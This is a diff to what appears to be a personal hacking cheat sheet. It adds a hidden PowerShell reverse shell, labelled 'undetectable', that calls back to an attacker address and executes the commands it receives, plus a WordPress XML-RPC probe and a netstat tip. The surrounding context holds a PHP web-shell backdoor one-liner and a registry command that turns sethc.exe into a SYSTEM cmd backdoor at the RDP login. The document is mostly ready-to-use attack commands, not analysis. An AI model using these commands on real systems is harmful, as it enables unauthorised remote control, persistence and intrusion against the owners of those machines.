@@ -19,6 +19,9 @@ Backdoor One-Liner
 Smaller Backdoor One-Liner
 <?=`$_GET[_]`?>
 
+Undetectable Hidden Win 10/11 Reverse Shell
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('YOUR_IP', PORT);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+
 ----------------------------------------------------------
 
 Python Privilege Escalation
@@ -308,6 +311,8 @@ mysql -u root -p -h #SERVER IP ADDRESS#
 
 you could try curling the open ports of the webserver from itself (use 127.0.0.1) and is there is a mysql port, you could try finding the login page, extracting the password, and logging in to see other data
 
+you can also use netstat -tuln to find open ports and services
+
 ---------------------------
 
 DECRYPTING PGP FILE
@@ -471,3 +476,9 @@ At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM
 Create RDP Backdoor using sethc.exe
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 Hit F5 a bunch of times when you are at the RDP login screen.
+
+--------------------------------
+Test WORDPRESS XMLRPC PINGBACK
+curl --data "<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" https://#WORDPRESS_SITE#/xmlrpc.php
+
+
